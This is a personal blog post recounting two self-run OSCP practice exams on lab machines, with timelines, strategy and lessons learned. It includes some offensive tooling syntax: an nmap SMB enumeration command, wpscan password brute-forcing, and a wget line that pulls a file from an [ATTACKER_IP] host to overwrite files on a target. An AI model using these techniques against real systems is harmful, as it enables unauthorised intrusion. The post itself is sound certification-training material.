# OSCP Practice Exams - A Writeup

In this blog post I want to give an overview of my experience doing an OSCP practice exam, and share the strategy I took and the lessons I learned. I hope this article, and the attached reports (at the end of this post), will be useful for people looking to sit the exam in future.

You can also find this note in the form of a blog post on [my website](https://www.mac-goodwin.com/blog/cyber/2021/09/29/oscp-practice-exams.html).

## Intro

As part of my prep for OSCP I wanted to do a fully simulated practice exam. I wanted a chance to test my methodology, get a feel for the timings of the exam, and most importantly just get a confidence boost before the real thing.

I highly recommend doing this - it gives you a sense of the scope of boxes you might face, and will teach you valuable lessons.

Perhaps most valuable were the lessons I learned about the report writing, and what to capture as I went along. When I came to write it up, there were several screenshots I wish I had (and I take pretty comprehensive notes).

I did my first practice exam on 21/08/21, starting at 09:45. I started as close to my real start time as possible, which would end up moving after I extended my lab time. At this point I'd done just under 20 boxes, and wasn't feeling super confident. I'd also not done a lot of the course content, and read the Buffer Overflow content the night before having never done one from scratch.

Safe to say, the exam didn't go brilliantly, but I learnt a lot of valuable lessons. I failed with 55 points, having failed to get a foothold on the 25 point machine, and failing to root a 20 pointer. Within half an hour of the exam ending I'd finished the 20 pointer and would have passed, but it wasn't to be. I may have gotten partial points for the low-privilege shell I obtained, but it's hard to guess how many.

In my second attempt I wanted to have an experience closer to what I'd have on the actual exam - I intended to practice Buffer overflows a few times before I did it to get the methodology down. Unfortunately this didn't happen with work and other extracurricular commitments (this cert isn't friendly to people with lots of hobbies and a full time job), but I did root 12 more boxes in the labs in this time. I extended my lab time to 90 days to give myself a better chance to practice.

My second attempt was on 15/09/21, and I was feeling much more confident. Despite struggling after finishing the BOF and bouncing between several boxes without a foothold, I ended up passing with 75 points, only missing out on the non-BOF 25 point machine. After the exam I continued to finish several more boxes in the labs, finishing 33 overall (including two AD forests, 2 of the 'big three', and a couple of pivots into another network), and I'm now feeling pretty confident ahead of my exam in early October.

## Exam 1

|Date|Start Time|Points|
|---|---|---|
|21/08/21|09:45|55|

I spent the days before the exam migrating to my new computer and setting up Kali the way I liked it, as well as getting used to zsh, tmux, and their irritating quirks when used with Obsidian.

I'll give a spoiler free overview of how the exam panned out here, but you can read the report which I'll attach if you're interested in how the boxes were solved.

Considering how little I'd prepared, the Buffer Overflow went surprisingly smoothly. I followed the PDF pretty strictly, and after getting used to Immunity had finished it within ~3 hours. I'm glad I tackled it first and got it out of the way - however the next few hours were painful and without much progress.

I took plenty of breaks, and towards the end of the night I got some footholds. The 'easy' box took longer than I expected, and was probably a bit more involved than Grandpa/Granny/Netmon would have been (the other 10 pointers that were recommended). I would definitely pick one of these machines over Buff, depending on whichever ones you *haven't* done - they're more similar in style to the easier OSCP Lab machines (but I can't speak for the real exam 10 pointers).

### Machines

- Buff (Hack the Box) - 10 points
- Cronos (Hack the Box) - 20 points
- Bastard (Hack the Box) - 20 points
- Kotarak (Hack the Box) - 25 points
- Brainpan (Vulnhub) - 25 points (Buffer Overflow)

### Timestamps

**Pre Exam**
- Up at 07:30, breakfast and shower
- 08:10 started setting up Brainpan
- 09:20 Brainpan is set up, warm up with some Led Zeppelin
- 09:30 all creds are downloaded for HTB VPN etc
- 09:35 setup tmux ready to start recon

#### Exam

**Exam Start - Tackling Brainpan**
- 09:45 started scanning brainpan, and ran nmap automator on kotarak in background with intention to start it straight after BOF
- spent 20 minutes battling trying to get terminal output to work properly in new computer - wasted time, but about 10:05 continued enumerating brainpan
- 10:15 found the binary I needed
- by 10:53 I was hooked up to Immunity in my Windows Host and had found the input needed to overflow the binary
- by 11:42 I had found the space allowed for my shellcode
- I spent a few minutes documenting the process and battling with Immunity, and by 12:45 I had shelled the machine!
- I took a 15 minute celebratory break then attempted to priv esc
- by 13:32 I had given up with privesc - I've since been reliably informed that on the actual exam you're not expected to privesc the BOF machine, but I didn't know this until later

**First Attempt at Kotarak**
- 13:35 ish started reviewing Kotarak services
- had found an interesting service and a potential vector, but couldn't get any RCE or file reading to work - took a break at 14:25
- came back at 14:55 and found a couple of potential CVEs by 15:05, but by 15:30 I'd run out of ideas for how to exploit them - I documented my progress and made a note to come back to it
- from 15:30 - 16:55 I wasted more time running Kernel Exploits on brainpan, but had no luck
- at this point I had spent 8 hours and done nothing but the Buffer Overflow (and I was thinking I only had partial points)

**Buff**
- 17:00 had a quick banana and enumerated Buff
- 17:17 Buff was shelled - this was a nice confidence boost
- I spent a while getting a proper reverse shell, and found a vulnerable service for privesc by 18:45
- by 19:30 I had completed the machine

**Cronos**
- 20:10 started Cronos after tea
- poked at DNS for 15 minutes and eventually found a domain
- had remote code execution by 20:52, and a shell by 21:01
- had root by 23:44

**Bastard**
- cleaned up my notes on Cronos and started scanning by 00:02
- found a potential exploit by 00:09, and had a shell by 00:15
- tried some privesc exploits and gave up for the night at 00:35
- up at 07:30 and reconnected to the machine by 07:55
- tried a few different shell methods for better interactivity, and went for some food at 08:30
- spent a few minutes enumerating - by 09:25 I had regained a meterpreter shell and successfully ran local exploit suggester
- final 5 minutes I tried a few different exploits, but ran out of time

At 09:30 the exam was over, and I had 55 points. I may have gained a few partial points from Bastard, but I don't know how many.

#### Report Writing

- I relaxed a bit, then spent the morning reading templates and creating one; I then started the report at 15:40
- I took a few breaks, and had written up all the boxes I finished by 21:00
- I left out Kotarak and didn't write up the privesc for Bastard, as I never finished it - all in all it took me about 2.5 hours, so I predict a full exam writeup might take 4 hours

### Lessons Learned

General Exam Efficiency Advice:
- revert your windows client straight away when starting the exam to turn it on ready for doing the Buffer Overflow
- practice using `zsh` and `tmux` in advance - they will make you faster once you're familiar with them and they're configured properly, but they were a stumbling block during this exam
	- specifically, I had issues with upgrading shells and terminal history size when using `tmux` - when catching shells in future and running enumeration scripts like LinPEAS, I'll try to do so in a non-tmux, `/bin/bash` window
	- it's also worth splitting `tmux` windows horizontally wherever possible, as copying terminal output from a vertically-split window is tricky
	- I went for a tmux session per machine, with multiple panes within each - this left me with multiple tabs in one terminal window, which felt pretty easy to handle
- don't be afraid to use metasploit (it's faster and more powerful after all) - but use it once you've done the rest of the boxes or have run out of options
- I took about 7 hours of sleep - I'll probably go for less next time, as even another 20 minutes on Bastard would have allowed me to find the correct exploit

Privilege Escalation:
- always run Lin/WinPEAS after trying your initial "quick-win" checks (e.g. `sudo` permissions and SUID binaries)
- add the following to your common privilege escalation checks for enumeration:
	- apache's sites-enabled directory
	- the kernel version for Kernel exploits
	- the architecture, so you don't get caught out trying to run the wrong kind of binary
- if stuck on privesc, try a Kernel Exploit
- [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) and [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) privesc checklists are available
- generally with Windows I need to be more methodical
	- always run `systeminfo` and local exploit suggester/meterpreter local exploit suggester first
	- check privileges and try potato or printspoofer exploits
	- then run through exploit suggester suggestions, prioritising ones you've had success with before
	- run WinPEAS if there are no quick wins and look for credentials in memory etc

New Tricks, Tools, and Skills:
- Checking [Dirty COW Vulnerable versions](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions#ubuntu)
- Using [xclip](https://stackoverflow.com/questions/749544/pipe-to-from-the-clipboard-in-bash-script) to copy text from terminal
- A [checklist](https://book.hacktricks.xyz/shells/shells/windows) for different Windows shell methods - work through these methodically when exploiting RCE
- Similarly, a list of [file transfer options](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/) to try methodically for each OS - on Windows SMB is the simplest one to try first, and on Linux I go for `wget`
- Using [chisel](https://github.com/jpillora/chisel) for port forwarding
- The use of meterpreter's `execute` command for running `.exe` files
- If you find a password hash and have a known password, try hashing the password to see if it matches the hash before wasting time cracking it
	- similarly, try basic variations of known passwords before cracking or bruteforcing
	- try passwords that looked hashed or encoded as plaintext just in case it's just a strong password

Note Taking for Report:
- I've struck a good medium between taking detailed notes and taking notes quickly - previously my note taking has slowed me down, but by cutting out 'narration'-style note taking (where I'd describe my thought process as if I'm doing a writeup) and sticking to copying command outputs and taking screenshots I shaved off a lot of time
- I learned the hard way that it's better to take screenshots of key scans such as `nmap` and `nikto`, rather than copying the output - it looks better on the page as a picture, and is harder to fabricate
- Also remember to **always** screenshot the moment you get an initial shell, as this is something you'll also miss if you don't get it; other important findings include DNS zone transfers and credentials found in files
- Make sure you grab the `local.txt` files on the exam, as they weren't on the practice exam so you need to remember to do this on the day
	- also make sure to copy the contents of the file as well as taking a screenshot, so you can add it to the report

## Exam 2

|Date|Start Time|Points|
|---|---|---|
|15/09/21|10:00|75|

For the second exam I was feeling a lot more confident, and had rooted a few extra boxes in the labs. However, despite intending to complete the Buffer Overflow Prep Room on TryHackMe, I had only done one Buffer Overflow from scratch.

I picked non-HTB machines for this exam, and tried to go for ones that were custom-made to be similar to OSCP machines. Lemonsqueezy, for example, is modelled on a combination of two 20-point boxes. I thought that custom OSCP-style boxes would be better practice than HTB, as sometimes the style is wildly different.

The exam went much more smoothly, and although I did not finish the 25 point machine I felt like my methodology was much better this time around and I enumerated much more thoroughly. One major improvement was the use of `autorecon`, which I'd fallen out of favour with for a few reasons earlier in my OSCP preparation. However it pulled through on this exam and found a lot of useful information, namely around enumerating filesharing services.

### Machines

- Lazysysadmin ([Vulnhub](https://www.vulnhub.com/entry/lazysysadmin-1,205/)) - 10 points
- Lemonsqueezy ([Vulnhub](http://www.vulnhub.com/entry/lemonsqueezy-1,473/)) - 20 points
- Mercy ([Vulnhub](http://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/)) - 20 points, Kernel Exploitation disallowed
- Stapler ([Vulnhub](http://www.vulnhub.com/entry/stapler-1,150/])) - 25 points
- dostackbufferoverflowgood (Just the Binary, part of the [TryHackMe BOF Prep Room](https://tryhackme.com/room/bufferoverflowprep)) - 25 points

### Timestamps

Again, I spent the morning setting up (which was a lot less stressful this time as I wasn't trying to spend it learning Buffer Overflows and Tmux from scratch).

I was up at 8:00, and had connected via RDP to the TryHackMe room by 09:55 ready to start.

My strategy was as follows:
- Buffer Overflow straight away
- 10 pointer
- 20 pointer
- 20 pointer
- If I'm successful in the above, I'll have passed, and could do the 25 pointer just for fun (assuming no marks are deducted from my report). If I struggled to root any of the above boxes, I'd need to tackle the 25 point machine

#### Exam

**Exam Start - dostackbufferoverflowgood**

- Start at 10:00, scan the THM machine for open ports
- By 10:15 I had identified the binary and managed to cause it to crash
- I spent 40 minutes writing a Python script for sending payloads, having to adjust it for an unusual requirement in the binary
- By 11:07 I'd identified bad characters, and found a `JMP ESP` instruction by 11:15
- I'd shelled the machine by 11:36, and had 25 points - I was feeling pretty good at this point, as I was roughly 90 minutes quicker than the first exam's BOF
- I spent a few minutes documenting my process, then moved on to the next box

**Trying Lazysysadmin**

- I started enumerating lazysysadmin at 11:55
- I spent a surprisingly long time looking for a foothold, and began brute forcing
- I had a false positive password match on Hydra by 12:45, and after another 15 minutes of flailing I went for lunch at 13:00

**Trying Lemonsqueezy**

- At 13:24 I started lemonsqueezy, and pretty quickly found some usernames but struggled to brute force a password or find any other foothold. This box had a frustratingly small attack surface
- I ran Hydra at 13:55 and spent ten minutes reviewing and summarising my enumeration results - this was a very valuable activity, and proved extremely useful later on when I came back to this box
- By 14:10 I started the next box, leaving Hydra running in the background

**Trying Mercy & Getting Stuck**

- I spent the first 40 minutes making very little progress - I had a look at some CVEs and found a potential password, but nowhere to leverage it
- I started feeling like the only options I'd found on these boxes so far were brute forcing credentials, which was a little disheartening
- I eventually stopped looking at Mercy and went back to brute forcing lemonsqueezy using a different technique via Metasploit - unfortunately, this caused my Kali VM to hard crash, and I took this as a sign to take a break

**Trying Stapler**

- From 15:00 - 16:15 I took a fairly long break, and eventually came back to try Stapler
- I spent a lot of time manually enumerating the large number of services, and had some potential usernames and a few well-hidden secrets by 16:48, but not much else
- This box frustrated me, as I put quite a lot of effort into enumerating some services, and found a 'way in' to a lot of them - but this effort never seemed to lead to any sort of foothold
- To try and escape these rabbit holes, I started digging into each service's version numbers looking for exploits as methodically as I could, but I got no further

**Reviewing Boxes & Finishing lazysysadmin**

- At 17:15 I took a step back from Stapler and did a review of each box. Many of the boxes had a large number of potential vectors, but very little to actually play with besides login screens. I thought `autorecon` might do a good job at picking up something I might have missed
- I manually poked at lazysysadmin using the information I'd gathered into my summary, and eventually gave up at 17:41 and launched `autorecon`
- While autorecon ran I went for tea, and came back at 18:35 to review the results - by 18:51 I had finally found some credentials, which led to a shell on the box at 19:00 and root by 19:01
- This was a much needed breakthrough, and I was up to 35 points with 15 hours to go

**More Enumeration and Giving up on Stapler**

- I took a 15 minute break and came back to reviewing lemonsqueezy at 19:16
- I hadn't found anything new by 19:55, so switched over to Stapler. I ran autorecon in an attempt to escape the several rabbit holes, and reviewed all the information I had
- By 20:25 I'd found some new services, and had a bit of a motivation boost. I enumerated this service until 21:45 when my Virtual Machine crashed again, and I took another break
- From 22:05 - 22:23 I continued to enumerate, and eventually ran out of ideas for the box - I had scanned every service and directory, found several interesting scan results that I couldn't replicate manually, and hit dead ends with the two most interesting services
- I recapped Mercy and ran `autorecon` against it, and started brute force again at 22:45 after running out of ideas
- I poked at some services manually while it ran, and eventually finished at 23:00 leaving the brute force to run overnight

**Breakthrough on Lemonsqueezy**

- I was up at 06:30 the next morning, had a quick shower, and sat down to tackle lemonsqueezy again at 06:50
- I took a step back and enumerated everything methodically again, referring to Hacktricks for each service wherever I could
- By 07:26 I finally had access to an administrative console, and took a quick break at 07:30 for breakfast
- I was feeling good, and knew rooting this and Mercy would let me pass - while I was working on a shell I ran some extra scans on Mercy in the background
- By 07:36 I had access to a new administrative console, and by 07:57 I had Remote Code Execution!
- I spent a while attempting privilege escalation, and started some new brute forcing on Mercy on 08:28 while trying an exploit
- By 08:30 I had rooted lemonsqueezy - I had 55 points, with 90 minutes to go

**Rooting Mercy and Finishing the Exam**

- Using autorecon I found some useful new information, and I had access to a fileshare at 08:48
- By 09:05 I'd exposed the hidden services on the box, and had access to an administrative console
- By 09:14 I had code execution on the box
- I immediately ran LinPEAS as I only had 20 minutes left - I spotted a crucial file misconfiguration at 09:38, with less than ten minutes to go
- I struggled with the terrible shell that I had, but eventually rooted the box - I was actually five minutes over the allowed time, but I counted it as a win

#### Report Writing

- I was pretty tired, and spent 10:00 - 13:30 slowly documenting what I'd done with a few breaks
- By 13:38 I started the report itself - I took quite a few breaks, and only really spent 3.5-4 hours total on it spread over nearly 9 hours
- I had finished the report by 20:36

### Lessons Learned

General Methodology:
- If you're struggling with a foothold, look for slightly less common file extensions in your scan names - `.txt`, `.pl`, `.sh`, `.cgi`
- Even if you don't love `autorecon`, run it when you're stuck! I prefer manual enumeration initially, but some of autorecon's choices of `nmap` scripts found things I couldn't find manually
- This `nmap` command is great for enumerating SMB share contents if you can't find anything with `smbclient` or `smbmap`: `nmap -vv --reason -Pn -sV -p 139 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args=unsafe=1`
- If you have a username or a password, try it on ALL services! Password reuse is a common foothold vulnerability
	- Similarly, if you can't get anonymous access to a service (SMB, FTP etc) don't forget about it once you *do* have creds - I put these services aside once I couldn't get access, and it took a while to click that I might have password reuse
- Google the version numbers for *every* service - even if it's not a service you'd usually attack, such as SSH
- Spending time reviewing all the information you have is a valuable activity and can help you spot attack vectors

New Tricks, Tools, and Skills:
- To view all autorecon results at once, navigate to `scans/[IP]/results` and type `cat *.txt | less`
- `wpscan` has a brute-force mode that uses XMLRPC to guess passwords, which can save you using a metasploit allowance when brute forcing `/wp-admin` logins - the syntax is `wpscan --url [URL] --usernames [LIST] --passwords [LIST]`
- If you have a bad shell with limited interactivity (i.e. no text editors), a good way of overwriting a file on the target is to edit and host it locally, and then use `wget -O target_file http://[ATTACKER_IP]/edited_file`

Privilege Escalation:
- if a 'vulnerable' file (e.g. a SUID, cron job running as root etc) looks familiar (i.e. a standard SUID like `passwd`), don't ignore it - it's slower, but checking each of these files' permissions manually could show you a writeable binary that you can hijack

Note Taking for Report:
- if you got access to FTP/SMB file contents via an automated script like `nmap`, make sure you can explain *why* - it's helpful to get a screenshot of a manual version of the command, so you can explain what led to the access (e.g. weak credentials, null authentication etc)
- **ALWAYS** copy the final command you used for a shell
- get a screenshot of the command/action you used to spawn a shell, as well as the shell returning - for example, note down the URL of a request to a webshell and take a screenshot of the page or a Burp Repeater window
- Remember to fill in the appendices for proof file contents, meterpreter usage etc
- I also restructured my report this time to include the `nmap` results for each machine with the rest of that machine's writeup, instead of having all scans in the Information Gathering section

Exam Efficiency:
- next time, sleep less if you don't have many points by the end of the first day! aim for 00:00 - 06:00, as you needed the extra five minutes

## General Lessons Learned

These are some of the more generic lessons I learned that weren't tied specifically to one of my practice exams:
- I learned to trim a lot of the extra information in my report in comparison to a writeup, where i'd normally document every step I tried
- Knowing when to take a break or move on to a new box is difficult, but setting 30 minute timers and taking regular reviews of the information you have so far is helpful
- Similarly, knowing when to brute force is a tricky skill - I resorted to brute forcing for a few of these boxes, and it was only the correct approach on one of them. If you're out of ideas review what you have first, but if you have nothing don't be scared to run Hydra or a WordPress scan
	- However, if you don't find a correct password pretty quickly on a CTF-style machine, brute forcing probably isn't the correct approach

I tried to do both exams as close to my exam start time as possible, as it was already booked. Morning starts work well for me, as I'm nice and alert once I've eaten. However, there is definitely a slump in the afternoon, so if you have the time to do so I'd recommend trying a practice exam with a morning start *and* one with an afternoon start to see what you like best, then book your exam.

## Conclusion

I hope you enjoyed these writeups. I know this is a long blog post, but I always enjoy posts about people's strategies and timings for the exam.

I hope that the *Lessons Learned* sections are useful - I try to do something similar for every machine I tackle, especially highlighting mistakes in methodology that can apply to multiple boxes, rather than specific vulnerabilities. It's a valuable activity to undertake while revising.

I have also uploaded my report for each exam. There are *lots* of report templates out there (I borrowed from [this one](https://www.offensive-security.com/pwk-online/PWKv1-REPORT.doc)), but not many example reports, so hopefully seeing one will be useful.

Exam 1 Report available [here](https://www.mac-goodwin.com/blog/attachments/Practice%20Exam%201%20Report.pdf).

Exam 2 Report available [here](https://www.mac-goodwin.com/blog/attachments/Practice%20Exam%202%20Report.pdf).

When I originally wrote this post, I hadn't yet passed the exam - I since have, so you can trust that the writing style is at least passable!

Thanks for reading, and good luck to anyone taking the exam!

## Discussion

I also [posted this blog](https://www.reddit.com/r/oscp/comments/pxtjk2/practice_exam_writeups_sample_reports/) on Reddit, and answered some questions there about the post - check it out if you have any questions!